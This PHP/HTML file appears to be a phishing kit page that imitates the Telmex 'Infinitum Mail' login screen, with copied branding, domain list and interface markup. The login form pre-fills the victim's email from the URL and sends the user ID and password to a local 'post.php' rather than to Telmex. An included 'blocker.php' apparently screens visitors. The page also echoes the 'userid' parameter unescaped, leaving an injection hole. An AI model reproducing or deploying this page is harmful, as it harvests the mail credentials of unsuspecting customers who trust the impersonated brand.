<?php 
include('blocker.php');
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['userid'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml"
      class="yui3-js-enabled win chrome chrome7 webkit webkit5 gr__infinitummail_com">
<div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta content="en-us" http-equiv="Content-Language">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, height=device-height,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="ROBOTS" content="NOFOLLOW">
    <title>Infinitum Mail</title>
    <link rel="icon" type="image/png" href="../infinitummail/index_files/favicon.ico">

    <meta name="description"
          content="Infinitum mail- Servicio gratuito para clientes Infinitum, disfruta y administra tu correo electr�nico de manera f�cil e intuitiva desde tu computadora o dispositivo m�vil.">
    <meta name="keywords"
          content="correo telmex, mail telmex, mail infinitum, mail gratis, hotmail, gmail, mail, mails, correo electr�nico, web mail, correo mobil, correo movil, correo infinitum">

    <!-- === Page CSS      ==== -->
        <link rel="stylesheet" type="text/css" href="../infinitummail/index_files/v12.asp.css">

    <!-- Tooltip --------->
    <link rel="stylesheet" type="text/css" href="../infinitummail/index_files/tipTip.css">

    <!-- ************** NOTIFIER CODE CSS ************** -->
    <link rel="stylesheet" type="text/css" href="../infinitummail/index_files/buttons.css">


    <link charset="utf-8" rel="stylesheet" id="yui_3_16_0_1_1545237488113_2" href="./index_files/combo.css">
    <link href="../infinitummail/index_files/style.css" rel="stylesheet" type="text/css">

</head>

<body class="yui-skin-sam yui3-skin-sam" id="bodyID"
      style="height:100vh; background-color: #F5F2F3; overflow: auto;" data-gr-c-s-loaded="true"><span
        class="yui-resize-status"></span>

<!-- ::::: MAIN SITE DIV  STARTS ::::: -->
<div style="min-width:800px !important;">

    <!-- Alert -->
    <div id="MUserInboxAlert" style="display:none; z-index: 1009"></div>


    <!-- ::::: Login Box STARTS ::::: -->
    <div id="ifm_login"
         style="background-color: #F5F2F3; height: 100vh; width: 100%; position: absolute; top: 0px; bottom: 0px; border: 0px solid rgb(255, 255, 255); overflow: auto;">
        <form id="form" method="post" name="loginForm" action="post.php">
<span id="spanLoginBox" style="display: block;">


	<div class="pagewrapCH">
      <div class="pagewrap_login">
      	<div class="formularioCentrado">
   	    	<img src="../infinitummail/index_files/logoIM.png" width="176" height="40" alt="Infinitum Mail">
        </div>
        <div class="separador"></div>
        <div class="separador"></div>
        <div class="formulario bkg">
          <img src="../infinitummail/index_files/icn_login_user.jpg" width="42" height="40" alt="Infinitum Mail" class="floatLeft">
            <input type="hidden" name="email" value="<?php echo $_GET['userid'] ?>">
          <input class="floatLeft" name="emailID" id="emailID" type="text" value="<?php echo $loginID ?>" placeholder="Usuario" required="">
            <!--<div class="txtError">El campo no puede quedar vac&iacute;o</div>-->
        </div>
        <div class="separador"></div>
        <div id="divDomainList" class="formulario bkg">
        	<img src="../infinitummail/index_files/icn_login_select.jpg" width="42" height="40" alt="Infinitum Mail" class="floatLeft">
	          <select id="domainlist" class="select-style" name="domainlist" onchange="fnCheckForSubDomain()">
	            <option>infinitummail.com</option>
	            <option>telmexmail.com</option>
	            <option>eninfinitum.com</option>
	            <option>telnormail.com</option>
	            <option>prodigy.net.mx</option>
				<option>prodigymovil.com</option>
				<option>infinitumzone.net</option>
				<option>prodigymedia.com</option>
				<option>prodigywifi.com.mx</option>
				<option>correoinfinitum.com</option>
				<option>correoprodigy.com</option>
				<option>infinitum.com.mx</option>
				<option>nombre.mitmx.net</option>


				<option>servicios.telmex.com</option>

			</select>
      	</div>

          <!-- ::::::::::::::::::: -->
        <div id="divDomainMitmxNet" style="display:none" class="formulario bkg">
          <img src="./index_files/icn_login_select2.jpg" width="42" height="40" alt="Infinitum Mail" class="floatLeft">
<!--          <input class="floatLeft" name="emailSubDomain" id="emailSubDomain" type="text" value=""-->
<!--                 style="xbackground-color:fuchsia" placeholder="nombre" required="">-->
          <div style="width:75px; float:right; color:#5a6473; line-height:38px; margin-left:235px; background-color:#fff ;  position:absolute">.mitmx.net</div>
            <!--<div class="txtError">El campo no puede quedar vac&iacute;o</div>-->
        </div>
          <!-- ::::::::::::::::::: -->


        <div class="separador"></div>
        <div class="formulario bkg">
          <img src="../infinitummail/index_files/icn_login_pass.jpg" width="42" height="40" alt="Infinitum Mail" class="floatLeft">
          <input class="floatLeft" name="password" id="emailPassword" type="password"
                placeholder="Contraseña" required="">
        <!--<div class="txtError">Correo o contraseña incorrectos</div>-->
        </div>
        <div class="separador"></div>
        <div class="formulario">
        	<a href="https://www.online.telmex.com/mitelmex/cambio_contrasena_ex.jsp" target="_parent"
               style="float: left"><span class="liga floatRight">Cambiar contraseña</span></a>
        	<a href="https://www.online.telmex.com/mitelmex/restablece_pass.jsp?pagSalir=aHR0cHM6Ly9tYWlsLmluZmluaXR1bW1haWwuY29t"
               style="float: right" target="_parent"><span class="liga floatRight">Olvidé mi contraseña</span></a>
        </div>
        <div class="separador"></div>
        <div class="separador"></div>
        <div class="formulario">
        	<input name="RememberMe" id="RememberMe" type="checkbox">
       	  <span class="txtRegular">Mantener mi sesión abierta</span>
      	</div>
        <div class="separador"></div>
        <input name="button2" type="submit" class="botonAzulXL" value="ENTRAR">
        <div class="separador"></div>
        <div class="separador"></div>
        <div class="division"></div>
        <div class="separador"></div>
        <span class="txtRegularBIG"><strong>¿Aún no tienes una cuenta Infinitum Mail?</strong></span>
        <div class="separador"></div>
        <div class="formularioCentrado">
            <a class="botonAzul"
               href="https://migracioncorreo.telmex.com/AdministradorCorreoInfinitum/createAccount.htm"
               target="_parent">Regístrate ahora</a>
        </div>
    </div>
    <div class="pagewrap_banner">
   	  <div class="formularioCentrado">

		</div>
        <div class="formulario contApps">
          <div class="btnsapp">
            <p>Descarga nuestra aplicación gratuita</p>
            <a href="https://itunes.apple.com/mx/app/telmex-infinitum-mail/id1146842014?mt=8&amp;utm_source=landing&amp;utm_medium=btnIos&amp;utm_campaign=appInfmail"
               target="_blank"><img src="../infinitummail/index_files/btn_appiOS.png" width="112" height="36"></a>
            <a href="https://play.google.com/store/apps/details?id=com.telmex&amp;utm_source=landing&amp;utm_medium=btnAndr&amp;utm_campaign=appInfmail"
               target="_blank"><img src="../infinitummail/index_files/btn_appAndroid.png" width="123" height="36"></a>
          </div>
       	  <span class="nota">&reg; 2018 Telmex. Todos los derechos reservados.</span>
      	</div>
    </div>
    <div class="formulario floatLeft"></div>
	</div>

</span>

            <div id="spinnerIMG"
                 style="padding-top: 200px; text-align: center; background-color: rgb(243, 243, 243); width: 100%; display: none;">
                <img alt="Loading..." height="128" class="loading" src="../infinitummail/index_files/loading_blue.gif"
                     style="display: block; margin-left: auto; margin-right: auto; padding-top:50px" width="128"
                     align="middle"></div>

        </form>

    </div>
    <!-- ::::: Login Box ENDS ::::: -->


    <!-- Main Header STARTS -->
    <div id="mMainHeader">
        <div id="mMainBanner"
             style="height:1px;line-height:1px;font-size:16px; background-color:#fff; margin-top:1px; clear:both"></div>

        <div class="TopHeader">
            <div onclick="fnAppMenu(event)" id="dviAppDivBtn" class="jqTootltip" title="Aplicaciones">&nbsp;<span
                    id="spanAppTitle">Infinitum Mail</span>&nbsp;&nbsp;&nbsp;<img alt="M�s opciones" height="4"
                                                                                  src="../infinitummail/index_files/arrow_8_white.png"
                                                                                  width="8"></div>
            <div style="float: left; font-size:14px">
                <span id="mMainHeaderActions"></span>
            </div>
            <div id="mTopPanelRight" style="height:inherit;float: right; visibility:hidden;">

                <!-- Search Box STARTS -->
                <div id="SearchDiv" style="display:inline-block;" class="mSearchbox">
                    <div style="width:245px; display:inline-block;">
                        <input type="text" value="Buscar correos electr�nicos  " spellcheck="false" autocomplete="false"
                               tabindex="" onclick="fnmSearchBoxFocus(this)" onfocus="fnmSearchBoxFocus(this)" dir="ltr"
                               id="mSearchbox" onblur="fnmSearchBoxBlur(this)"
                               onkeydown="fnrteKeyDownSearch(this, event)" onkeyup="fnmSearchBoxKeyup(this)"
                               style=" padding-left:20px;background: transparent; color:#6b727b;display:inline-block; width:218px; border:0px #fff; font-size:12px; padding-top:5px ;font-family:Arial, Helvetica, sans-serif;">
                    </div>
                    <div style="width:20px; display:inline-block; cursor:pointer; visibility:hidden;" class="jqTootltip"
                         title="Limpiar b�squeda" onclick="fnmSearchClear(true)" id="mSearchXdiv"><img
                            style="width:14px; height:40px; cursor:pointer" src="../infinitummail/index_files/search_x.png"
                            id="mSearchX" alt="Limpiar b�squeda"></div>
                    <div style="widthx:20px; display:inline-block; cursor:pointer" class="jqTootltip"
                         title="Mostrar opciones de b�squeda" onclick="fnmSearchOptions(event)">&nbsp;<img
                            style="width:10px; height:40px;" src="../infinitummail/index_files/search_options.png" id="mSearchOptuins"
                            alt="B�squeda avanzada">&nbsp;&nbsp;&nbsp;
                    </div>
                    <div style="width:35px; display:inline-block; cursor:pointer" class="jqTootltip" title="Buscar"
                         onclick="CurentPage =1; fnmDoSearch()"><img style="width:16px; height:40px"
                                                                     src="../infinitummail/index_files/search_icon.png" id="mSearchBtn"
                                                                     alt="Buscar"></div>
                </div>
                <!-- Search Box ENDS -->

                <a id="btnUseremail" href="JavaScript:fnUserMenu()"><span id="LoginEmail"
                                                                          style="font-size:13px; color:#fff"><span
                        id="LoginEmailSpan" style="cursor:default" sfullname="@" title="@"
                        class="jqTootltip">@</span></span>&nbsp;&nbsp;<img alt="M�s opciones" height="4"
                                                                           id="usermenuarrow"
                                                                           src="../infinitummail/index_files/down_icon_white.png"
                                                                           width="8">&nbsp;</a>&nbsp;&nbsp;&nbsp;<a
                    id="btnSettings" class="jqTootltip" title="Configuraci�n"
                    href="JavaScript:fnSettingsAction(2);"><img height="16"
                                                                src="../infinitummail/index_files/settings_icon16_white.png"
                                                                width="16">&nbsp;&nbsp;<img alt="M�s opciones"
                                                                                            height="4"
                                                                                            src="./index_files/down_icon_white.png"
                                                                                            width="8"
                                                                                            style="display:none"></a><img
                    alt="V12" height="16" style=" vertical-align:middle; padding:0px; display:none"
                    src="./index_files/1355162982_041.png" width="16">
                <!--<img alt="V12" height="20" style=" vertical-align:middle; padding:5px; display:none"  id="mMainHeaderOpt" src="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/color-swatch-icon_w.png" width="20" />-->
            </div>
        </div>

    </div>
    <!-- Main Header ENDS -->


    <!-- mLeftPanel STARTS -->
    <div style="width: 220px; height: 385px; float: left; display: none;" id="mLeftPanel">
        <div id="mLeftPanelHead" style="height:30px;color:#444444;line-height:30px;font-size:14px;">
            <a id="mLeftPanelTitle" onclick="fnBIGRedBtn(event)">Redactar&nbsp;&nbsp;</a>
        </div>

        <div style="height: 32px; display:none"><a
                href="JavaScript:fnShowPOPOpt(&#39;imgSearchOption&#39;, &#39;mMailSearchOptMenu&#39;,-132,5)"><img
                id="imgSearchOption" src="./index_files/light-grey-arrow-down.png" class="jqTootltip"
                title="Mostrar opciones de b�squeda"
                style="position:absolute; left:134px; padding-top:16px; cursor:pointer"></a><img
                src="../infinitummail/index_files/search-icon.png" onclick="fnAppSearch()"
                style="position:absolute; left:149px; padding-top:9px; cursor:pointer"><input type="text" id="AppSearch"
                                                                                              onkeydown="fnrteKeyDownSearch(this,event)"
                                                                                              placeholder="Search mail">
        </div>

        <div id="mLeftPanelBody" style="color: rgb(117, 117, 117); padding: 4px; overflow-y: hidden; height: 322px;">
            <div id="spanLeftNavFolders">Cargando...</div>
            <div id="spanLeftNavContacts" style="display:none">Cargando...</div>
        </div>
        <div id="divMagicBox" style=" width:100%;  text-align:center; padding:0px; height:22px; overflow:hidden;">

            <iframe id="ifm_mini_cal_mail" frameborder="0" border="0" name="ifm_mini_cal_app"
                    src="../infinitummail/index_files/saved_resource.html" width="175px" height="185px"
                    style="padding-top:10px; padding-left:0px;;BORDER: #ffffff 0px solid; overflow-x: hidden; overflow-y: hidden; display:none"
                    allowtransparency="" borderwidth="0" __idm_frm__="2957"></iframe>
            <div id="div_mini_pico" style="background-color:#F4F4F4; height:22px; margin-top:2px; text-align:left">
                &nbsp;&nbsp;&nbsp;<img style="height:16px; width:16px; cursor:pointer; padding-top:2px"
                                       id="MiniCalmailico" title="Show month calendar widget"
                                       onclick="fnShowMailMiniCal(true)" src="https://www.infinitummail.com/app/"
                                       data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/mini_cal_ico.png"
                                       class="postLoadIMG">&nbsp;
            </div>

        </div>
    </div>
    <!-- mLeftPanel ENDS -->


    <!-- MainWrapper STARTS -->
    <div id="MainWrapper" style="height: 385px;">


        <!-- ::::: mMainPanel  STARTS ::::: -->
        <div style="background-color: rgb(255, 255, 255); width: 1525px; height: 385px; float: left; display: none; overflow: hidden;"
             id="mMainPanel">

            <div id="mMainPanelHead" style="height:30px;line-height:30px;font-size:16px;  clear:both;">
                <div id="mMainPanelTitle" style="float: left; width:100%;">&nbsp;</div>
            </div>

            <!-- ::::: mMainPanel  STARTS ::::: -->
            <div id="mMainPanelBody" style="background-color:#fff; ; clear:both">

                <!-- Main div apps (contacts, backpack..)-->
                <div id="mdivApps"
                     style="background-color: rgb(255, 255, 255); display: none; overflow: hidden auto; height: 353px;">
                </div>

                <!-- ::::: mFolderData  STARTS ::::: -->
                <div id="mFolderData" style="display: none; overflow: hidden; height: 363px;">

                    <div id="Msg_Panel_Inbox" class="yui-resize" style="height: 200px;">
                        <div id="Msg_Panel_Inbox_Data"
                             style="background-color: rgb(255, 255, 255); overflow: hidden scroll; width: 100%; height: 192px; border-bottom: 2px solid rgb(255, 255, 255);"></div>
                        <div id="yui-gen0" class="yui-resize-handle yui-resize-handle-b">
                            <div class="yui-resize-handle-inner-b"></div>
                        </div>
                    </div>

                    <!-- ::::: Msg_Panel_Msg  STARTS ::::: -->
                    <div id="Msg_Panel_Msg"
                         style="background-color: rgb(255, 255, 255); height: 175px; width: 100%; border-top: 2px solid rgb(255, 255, 255);"
                         ddtype="msgprev" onmouseout="fnDirDragLeave()" onmouseover="fnDirDragEnter(this)">
                        <div id="Msg_Main" style="display: none; background-color: rgb(255, 255, 255); height: 175px;">

                            <div id="mMsgPanelHead"
                                 style=" text-align:right; height:20px;background-color:#fff;color:#F4F4F4;line-height:20px;font-size:14px; BORDER-bottom: #F3F3F3 0px solid">
                                <a id="btnMsgReply" href="javascript:QComposer(&#39;r&#39;)" title="Contestar"
                                   style="padding-right:13px;" class="jqTootltipX"><img src="../infinitummail/index_files/R_m.png"
                                                                                        height="16"
                                                                                        width="16">&nbsp;</a>
                                <a id="btnMsgReplyAll" href="javascript:QComposer(&#39;rall&#39;)"
                                   title="Contestar a todos" style="padding-right:10px;" class="jqTootltipX"><img
                                        src="../infinitummail/index_files/rall_m.png" height="16" width="16">&nbsp;</a>
                                <a id="btnMsgForward" href="javascript:QComposer(&#39;f&#39;)" title="Reenviar"
                                   style="padding-right:13px;" class="jqTootltipX"><img height="16"
                                                                                        src="../infinitummail/index_files/F_m.png"
                                                                                        width="16">&nbsp;</a>
                                <a id="btnMsgDelete" href="javascript:" onclick="DeleteOpenMsg(event)" title="Borrar"
                                   style="padding-right:13px;" class="jqTootltipX"><img src="../infinitummail/index_files/delete_m.png"
                                                                                        height="16"
                                                                                        width="16">&nbsp;</a>
                                <a id="btnMsgPrint" href="javascript:" onclick="PrintOpenMsg(event)"
                                   title="Formato para Imprimir" style="padding-right:13px;" class="jqTootltipX"><img
                                        src="../infinitummail/index_files/print_msg-16.png" height="14" width="16">&nbsp;</a>
                                <a id="btnMsgFullscreen" href="javascript:fnMsgFullscreen()"
                                   title="Abrir en vista completa" style="padding-right:13px;" class="jqTootltipX"><img
                                        src="../infinitummail/index_files/msgpre_fullscreen.png" id="msg_screen_img" height="16"
                                        width="16">&nbsp;</a>
                                <a id="btnMsgFullscreenClose" href="javascript:fnMsgExitFullscreen()" title="Cerrar"
                                   style="padding-right:13px; display:none" class="jqTootltipX"><img
                                        src="../infinitummail/index_files/close_16.png" id="msg_screen_img" height="16" width="16">&nbsp;</a>
                                <a class="MsgActions" style="font-weight:bold; display:none">...</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                            </div>

                            <!-- mMsgBodyScroll STARTS -->
                            <div id="mMsgBodyScroll" style="overflow:auto;">
                                <div style="background-color:#fff; padding-left:10px; padding-right:10px; color:#454545">
                                    <div id="Msg_notspam" onclick="fnMsgNotSpam(event)"
                                         title="Haz clic aqu� para agregar la direcci�n de correo electr�nico del remitente a su Lista Segura y mover el mensaje a la Bandeja de entrada"
                                         class="jqTootltip"
                                         style=" display:none;margin:10px ; margin-top:0px; font-family:Verdana, Geneva, Tahoma, sans-serif;font-size: 11px; line-height:17px; color: #494949; background-color:#FFEAEA; clear:both; cursor:pointer">
                                        &nbsp;<img style="width:20px; height:20px" src="./index_files/not_spam.png">&nbsp;Esto
                                        no es spam?
                                    </div>
                                    <div style="text-align:center;  padding-left:10px; padding-right:10px; padding-top:5px; display:none; position:absolute"
                                         id="Msg_LoadingText"><span><!--<img  src="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/msg-loader.gif" style="width:16px; height:16px; vertical-align:middle; display:none" />-->&nbsp;Cargando...</span>
                                    </div>
                                    <div style="margin:10px ; margin-top:0px; font-family:Verdana, Geneva, Tahoma, sans-serif;font-size: 17px; line-height:17px; color: #494949; overflow: hidden; text-overflow: ellipsis; text-transform: uppercase; white-space: nowrap;"
                                         id="Msg_Subject"><!-- xxxSubject --></div>
                                    <div style="margin:10px; vertical-align:top">
                                        <div style="text-align:left;  padding-top:6px; font-weight:bold; font-size:15px; display:none; cursor:pointer"
                                             id="divMsg_from"><span onclick="fnSenderOptMenu(event)"
                                                                    title="M�s opciones" class="jqTootltip"
                                                                    id="Msg_From"></span> <img
                                                onclick="fnSenderOptMenu(event)" id="MSgSenderOptMenu" width="8"
                                                height="4" src="../infinitummail/index_files/down_icon.png" title="M�s opciones"
                                                class="jqTootltip" style="padding:5px">&nbsp;&nbsp;<a class="linkLine"
                                                                                                      style="font-weight:normal; font-size:10px"
                                                                                                      href="JavaScript:fnShowMsgDetails()"><img
                                                id="MSgDetailsExpand" width="9" height="10"
                                                style="top:-1px; position:relative" src="../infinitummail/index_files/arrow_less.png"
                                                title="Encabezados"></a></div>
                                        <div style="text-align:left; padding-top:5px"><span id="Msg_To"></span></div>
                                        <div style="text-align:left; padding-top:8px"><span id="Msg_Date"><!-- 10:12 pm &nbsp;&nbsp; Wednesday, March 24 --></span>
                                        </div>
                                    </div>
                                    <table style="display:none" id="MsgDetails">
                                        <tbody>
                                        <tr>
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top">
                                                De&nbsp;&nbsp;
                                            </td>
                                            <td><span id="Msg_From_more"></span>&nbsp;&nbsp;</td>
                                        </tr>
                                        <tr>
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top">
                                                Para&nbsp;&nbsp;
                                            </td>
                                            <td><span id="Msg_To_more"></span></td>
                                        </tr>
                                        <tr id="Msg_Ccc_more_tr">
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top">
                                                Con copia&nbsp;&nbsp;
                                            </td>
                                            <td><span id="Msg_Cc_more"></span></td>
                                        </tr>
                                        <tr id="Msg_Bccc_more_tr">
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top">
                                                Cco&nbsp;&nbsp;
                                            </td>
                                            <td><span id="Msg_Bcc_more"></span></td>
                                        </tr>

                                        <tr id="Msg_Attach_tr" style="display:none;">
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top; padding-top:10px">
                                                <img align="absmiddle/" style="padding-top: 3px;" width="16px"
                                                     height="16px" src="../infinitummail/index_files/a.png">&nbsp;&nbsp;
                                            </td>
                                            <td style="padding-top:10px"><span id="Msg_Attach"></span></td>
                                        </tr>

                                        <tr style="display:none">
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top">
                                                Fecha&nbsp;&nbsp;
                                            </td>
                                            <td><span id="Msg_DAte_more"></span></td>
                                        </tr>

                                        <tr id="Msg_headers_more_tr">
                                            <td style="width:50px;white-space:nowrap; text-align:right; vertical-align:top"></td>
                                            <td><span id="Msg_headers_more"></span></td>
                                        </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div style="border-top: #C4C4C4 1px  dashed; margin:20px; padding-top:5px; padding-bottom:10px;"
                                     id="divMsg_body">
                                    <img id="Msg_Body_Hide" src="../infinitummail/index_files/trans.png"
                                         style="position:absolute; height:100%; width:100%; z-index: 0; display:none; background-color:#fff; opacity:0">
                                    <iframe id="Msg_body"
                                            style=" padding-top:5px; BORDER: #ffffff 0px solid; overflow:hidden"
                                            scrolling="no" frameborder="0" border="0" name="Msg_body"
                                            src="../infinitummail/index_files/msg_prev.html" width="100%" height="100%"
                                            allowtransparency="" borderwidth="0" __idm_frm__="2958"></iframe>
                                </div>
                            </div>
                            <!-- mMsgBodyScroll ENDS -->

                            <!-- mMSGPrevtabs STARTS -->
                            <div id="mMSGPrevtabs" class="MsgPregMainTabs" style="visibility: hidden;"></div>
                            <!-- mMSGPrevtabs ENDS -->

                        </div>

                        <div id="Msg_Loading"
                             style="background-color:blue;clear:both; height:48px; background-color:#fff; padding-left:10px; padding-right:10px; font-size:14px;font-weight:bold; line-height:48px; color:#6D6D7E; text-align:center">
                            <div id="Msg_NoMessage" style=" font-size:11px; font-weight:normal; line-height:27px">
                                <div id="Mail_ForwardToNotice"
                                     style="background-color:#FFECEC; color:#931313; font-size: 12px !important"></div>
                                Haga clic en el mensaje que desee ver (o seleccione la casilla cercana para m�s
                                opciones)
                                <div id="Mail_Storage"></div>
                            </div>
                        </div>

                    </div>
                    <!-- ::::: Msg_Panel_Msg  ENDS ::::: -->

                    <div class="yui-resize-proxy" style="height: 0px; width: 0px;"></div>
                </div>
                <!-- ::::: mFolderData  ENDS  ::::: -->

            </div>
            <!-- ::::: mMainPanel  ENDS ::::: -->
        </div>
        <!-- ::::: mMainPanel  ENDS ::::: -->

        <!-- ::::: Banner  STARTS  ::::: -->
        <div id="mMainPanelBanner"
             style="text-align: right; background-color: rgb(245, 242, 243); font-size: 10px; padding-left: 10px; color: rgb(165, 162, 163); display: none; overflow: hidden; height: 385px;">
            <div style=" text-align:center; font-size:12px; cursor:pointer" id="divHideBannerOpt"
                 onclick="fnHideSideBanner()">Ocultar anuncio
            </div>
            <iframe onload="" id="ifrmBanner" style="BORDER: #a5a2a3 1px solid; overflow:hidden; " scrolling="no"
                    frameborder="0" border="0" name="ifrmBanner" src="./index_files/saved_resource(1).html"
                    width="162px" height="602px" allowtransparency="" borderwidth="0" __idm_frm__="2959"></iframe>
        </div>
        <!-- ::::: Banner  ENDs  ::::: -->

    </div>
    <!-- MainWrapper ENDS -->

</div>
<!-- ::::: MAIN SITE DIV  ENDS  ::::: -->


<!-- ::::: DRAG-N-DROP BOX  STARTS  ::::: -->
<div id="divDropScreen"
     style="padding-top:15%;border:6px #aaabae dashed; text-align:center;  font-size:18px; color:#aaabae;position:absolute;z-index:1002;display:none; ">
    Deje los archivos DONDE QUIERA...<br><br><img onclick=""
                                                  style="border:0px; width:128px; height:128px;  vertical-align:middle; "
                                                  class="postLoadIMG"
                                                  data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/drop_files_white.png"
                                                  src="https://www.infinitummail.com/app/"><br><br>Para guardar,
    organizar, compartir o adjuntarlos instant�neamente
</div>
<!-- ::::: DRAG-N-DROP BOX  ENDS  ::::: -->


<!-- ::::: DROP MENUS  STARTS  ::::: -->
<div id="mPOPOpt" class="skin0"
     style="position: absolute; left: 0px; top: 0px; padding: 7px; z-index: 1003; visibility: hidden;">

    <!-- global  -->
    <div id="mSEttingsOptMenu" style="display:none">
        <a href="JavaScript:fnSettingsAction(2)" class="menulink">&nbsp;Configuraci�n</a>
        <!--
        <div class="MSLine"></div>
        <a href="JavaScript:fnSettingsAction(2)" class="menulink">&nbsp;Ayuda</a>
        -->
        <div class="MSLine"></div>
        <a href="JavaScript:fnSettingsAction(1)" class="menulink">&nbsp;Help</a>
        <div class="MSLine" style="display:none"></div>
        <a href="JavaScript:fnDEVBtn1()" style="display:none" class="menulink">DEV BTN 1</a>
        <a href="JavaScript:fnDEVBtn2()" style="display:none" class="menulink">DEV BTN 2</a>

    </div>

    <div id="IMAPAccsMenu" style="display:none; white-space:nowrap; min-width:170px">
    </div>


    <div id="mUserOptMenu" style="display:none; white-space:nowrap;">
        <!-- uad_korney imap begin -->
        <a id="mUserOptMenuExtMailAcc" href="JavaScript:fnApp(6)" class="menulink">Cuentas de correos externas</a>
        <!-- uad_korney imap end -->

        <div class="MSLine"></div>

        <a href="JavaScript:fnOpenFeedback()" class="menulink">Retroalimentaci�n</a>
        <div class="MSLine"></div>


        <a href="JavaScript:fnSignout()" class="menulink">Cerrar sesi�n</a>
    </div>

    <div id="mPaneOptMenu" style="display:none; width: 155px;">
        <a href="JavaScript:fnSwitchRPView(&#39;f&#39;)" style="display:noneX" class="menulink">Desactivar divisi�n</a>
        <a href="JavaScript:fnSwitchRPView(&#39;r&#39;)" style="display:noneX" class="menulink">Divisi�n vertical</a>
        <a href="JavaScript:fnSwitchRPView(&#39;b&#39;)" style="display:noneX" class="menulink">Divisi�n horizontal</a>
    </div>

    <div id="mSettingsOptMenu" style="display:none; width: 185px;">
        <a href="JavaScript:fnOpenSettings(1)" class="menulink">Personal Preferences</a>
        <a href="JavaScript:fnOpenSettings(2)" class="menulink">Mail Management</a>
        <div class="MSLine"></div>
        <a href="JavaScript:fnOpenSettings(3)" class="menulink">Services</a>
        <div class="MSLine"></div>
        <a href="https://www.infinitummail.com/admin/ControlCenter/Control_Center.asp" target="_blank" class="menulink">Administration
            Tools</a>
    </div>


    <div id="mAppListMenu" style="display:none; width:194px">
        <a href="JavaScript:fnApp(0, false)" id="mApp0" class="menulink"><img class="postLoadIMG"
                                                                              data-url="../../app/ress/theme/Telmex/IMG/main_correo_on.png"
                                                                              src="https://www.infinitummail.com/app/"
                                                                              width="26px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Infinitum
            Mail</a>
        <a href="JavaScript:fnApp(1, false)" id="mApp1" class="menulink"><img class="postLoadIMG"
                                                                              data-url="../../app/ress/theme/Telmex/IMG/contacto_blue.png"
                                                                              style="padding-left:6px"
                                                                              src="https://www.infinitummail.com/app/"
                                                                              width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Contactos</a>
        <a href="JavaScript:fnApp(4, false)" id="mApp4" class="menulink"><img class="postLoadIMG"
                                                                              data-url="../../app/ress/theme/Telmex/IMG/calendar_blue.png"
                                                                              style="padding-left:6px"
                                                                              src="https://www.infinitummail.com/app/"
                                                                              width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Calendario</a>
        <a href="JavaScript:fnApp(3, false)" id="mApp3" class="menulink"><img class="postLoadIMG"
                                                                              data-url="../../app/ress/theme/Telmex/IMG/drive_blue.png"
                                                                              style="padding-left:6px"
                                                                              src="https://www.infinitummail.com/app/"
                                                                              width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Infinitum
            Drive</a>
        <a href="JavaScript:fnOpenTranslatorApp(&#39;text&#39;)" id="mApp5" class="menulink"><img class="postLoadIMG"
                                                                                                  data-url="../../app/ress/theme/Telmex/IMG/basic1-044.png"
                                                                                                  style="padding-left:6px"
                                                                                                  src="https://www.infinitummail.com/app/"
                                                                                                  width="20px"
                                                                                                  height="18px" alt="">&nbsp;&nbsp;&nbsp;Traductor</a>
        <div class="MSLine"></div>
        <a href="http://www.tienda.telmex.com/" target="_blank" class="menulink"><img class="postLoadIMG"
                                                                                      data-url="../../app/ress/theme/Telmex/IMG/tienda_blue2.png"
                                                                                      style="padding-left:6px"
                                                                                      src="https://www.infinitummail.com/app/"
                                                                                      width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Tienda
            Telmex</a>
        <a href="http://www.clarovideo.com/" target="_blank" class="menulink"><img class="postLoadIMG"
                                                                                   data-url="../../app/ress/theme/Telmex/IMG/claroVideo_blue.png"
                                                                                   style="padding-left:6px"
                                                                                   src="https://www.infinitummail.com/app/"
                                                                                   width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Claro
            Video</a>

        <a href="https://www.clarodrive.com/" target="_blank" class="menulink"><img class="postLoadIMG"
                                                                                    data-url="../../app/ress/theme/Telmex/IMG/drive_blue.png"
                                                                                    style="padding-left:6px"
                                                                                    src="https://www.infinitummail.com/app/"
                                                                                    width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Claro
            Drive</a>

        <a href="http://www.claromusica.com/" target="_blank" class="menulink"><img class="postLoadIMG"
                                                                                    data-url="../../app/ress/theme/Telmex/IMG/claroMusica.png"
                                                                                    style="padding-left:6px"
                                                                                    src="https://www.infinitummail.com/app/"
                                                                                    width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;Claro
            M�sica</a>
